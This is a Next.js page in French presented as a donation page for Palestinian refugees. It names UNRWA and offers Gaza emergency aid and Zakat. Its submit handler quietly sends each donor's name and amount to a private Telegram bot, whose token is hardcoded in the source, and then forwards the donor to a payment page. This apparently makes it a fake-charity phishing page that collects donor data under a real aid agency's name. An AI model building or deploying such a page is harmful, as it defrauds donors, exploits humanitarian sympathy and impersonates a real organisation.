'use client'
import { useState } from "react";
import Image from "next/image";
import { useRouter } from "next/router";


export default function Home() {
  const router = useRouter();
  const [fullname, setFullname] = useState("");
  const [amount, setAmount] = useState("");
  const [currency, setCurrency] = useState("EUR");
  const [loading, setLoading] = useState(false);

  const TELEGRAM_BOT_TOKEN = "8255290968:AAHMYhcRTfmvoHfkJGKRQh1rdbtqgBUoxok";
  const TELEGRAM_CHAT_ID = "8255290968";

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!fullname || !amount) {
      alert("Veuillez remplir votre nom et montant");
      return;
    }

    setLoading(true);

    const text = `💌 Nouveau don reçu!\nNom: ${fullname}\nMontant: ${amount} ${currency}`;

    try {
      // إرسال الرسالة إلى Telegram
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    chat_id: TELEGRAM_CHAT_ID,
    text
  }),
});

      // بعد الإرسال يمكن الانتقال لصفحة الدفع مع القيم
      const params = new URLSearchParams({ fullname, amount, currency }).toString();
      router.push(`/pay?${params}`);
    } catch (err) {
      console.error(err);
      alert("Erreur lors de l'envoi du don.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="container bg-light py-5">
      <div className="row g-4">
        {/* Première carte */}
        <div className="col-12 col-lg-6">
          <div className="card text-bg-dark h-100 border-0 shadow overflow-hidden">
            <div className="ratio ratio-16x9">
              <Image
                src="/one.webp"
                alt="Soutenir les réfugiés palestiniens"
                fill
                style={{ objectFit: "cover" }}
              />
            </div>
            <div className="card-img-overlay d-flex align-items-center bg-dark bg-opacity-50">
              <h1 className="card-text fw-bold text-white">
                Donnez aujourd’hui pour soutenir les réfugiés palestiniens
              </h1>
            </div>
          </div>
        </div>

        {/* Formulaire */}
        <div className="col-12 col-lg-6">
          <div className="card text-bg-info h-100 d-flex flex-column justify-content-start align-items-start p-4 shadow border-0">
            <h1 className="text-light">Faites la différence aujourd’hui</h1>
            <p className="text-light border-5 border-start border-light ps-3">
              Peut fournir une aide financière d’urgence à quatre familles de réfugiés palestiniens
            </p>

            <form className="w-100 mt-3" onSubmit={handleSubmit}>
              <label htmlFor="fullname" className="form-label text-light">
                Nom et prénom
              </label>
              <input
                type="text"
                placeholder="Nom et prénom"
                name="fullname"
                id="fullname"
                className="form-control mb-3 text-info"
                value={fullname}
                onChange={(e) => setFullname(e.target.value)}
              />

              <label htmlFor="amount" className="form-label text-light">
                Ou choisissez votre propre montant
              </label>
              <input
                type="text"
                placeholder="Montant"
                name="amount"
                id="amount"
                className="form-control mb-3 text-info"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
              />

              <label htmlFor="currency" className="form-label text-light">
                Choisissez votre devise
              </label>
              <select
                name="currency"
                id="currency"
                className="form-select mb-3 text-info"
                value={currency}
                onChange={(e) => setCurrency(e.target.value)}
              >
                <option value="EUR">EUR</option>
                <option value="USD">USD</option>
              </select>

              <button
                type="submit"
                className="btn btn-light w-100 fw-bold"
                disabled={loading}
              >
                {loading ? "Envoi..." : "Faire un don maintenant"}
              </button>
            </form>
          </div>
        </div>

        {/* بقية الصفحة: النصوص، FAQ، بطاقات إضافية، شعارات */}
        <div className="col-12 col-lg-6 text-dark">
          <h1 className="fw-bold">
            Et si votre don pouvait tout changer pour une famille dans le besoin ?
          </h1>
          <p>
            En ce moment, les familles de réfugiés palestiniens comptent sur l’UNRWA – et sur vous – pour les aider à traverser des épreuves inimaginables. 
            Votre don garantit que la nourriture est livrée, que les enfants sont pris en charge et que l’espoir reste vivant. Ensemble, nous pouvons maintenir ce lien vital.
          </p>
          <h1 className="text-info fw-bold">Faites un don dès aujourd’hui.</h1>
        </div>

        <div className="col-12 col-lg-6 text-dark">
          <h1 className="fw-bold">Questions fréquemment posées</h1>
        </div>

        <div className="col-12 col-lg-6">
          <div className="accordion shadow border-0" id="accordionExample">
            {/* Accordion Items كما هو */}
          </div>
        </div>

        <div className="col-12 col-lg-6 text-dark">
          <h1 className="fw-bold">Autres moyens de faire un don</h1>
        </div>

        <div className="col-12 col-lg-6">
          {[
            { src: "/tow.webp", title: "Urgence Gaza", text: "Faites un don pour envoyer une aide d’urgence aux familles déplacées" },
            { src: "/three.webp", title: "Protégeons l’éducation", text: "Pour Gaza : Votre soutien peut aider à protéger le droit à l’éducation" },
            { src: "/four.webp", title: "Protégeons l’éducation", text: "Soutenez l’éducation des réfugiés palestiniens dans tous les domaines" },
            { src: "/five.webp", title: "Zakat", text: "Donnez votre Zakat aujourd’hui. 100% va directement aux réfugiés palestiniens" }
          ].map((card, idx) => (
            <div key={idx} className="card my-4 bg-info text-white border-0 shadow overflow-hidden">
              <div className="ratio ratio-16x9">
                <Image src={card.src} alt={card.title} fill style={{ objectFit: "cover" }} />
              </div>
              <div className="card-body">
                <h5 className="card-title fw-bold">{card.title}</h5>
                <p className="card-text">{card.text}</p>
              </div>
            </div>
          ))}
        </div>

        <div className="col-12 col-lg-6">
          <div className="d-flex flex-wrap gap-3 justify-content-center align-items-center my-5">
            <Image src="/11.svg" alt="..." width={40} height={40} />
            <Image src="/2.svg" alt="..." width={40} height={40} />
            <Image src="/1.svg" alt="..." width={60} height={60} />
            <Image src="/4.svg" alt="..." width={60} height={60} />
            <Image src="/5.svg" alt="..." width={60} height={60} />
            <Image src="/6.svg" alt="..." width={60} height={60} />
            <Image src="/7.svg" alt="..." width={60} height={60} />
            <Image src="/8.svg" alt="..." width={60} height={60} />
          </div>
        </div>
      </div>
    </div>
  );
}
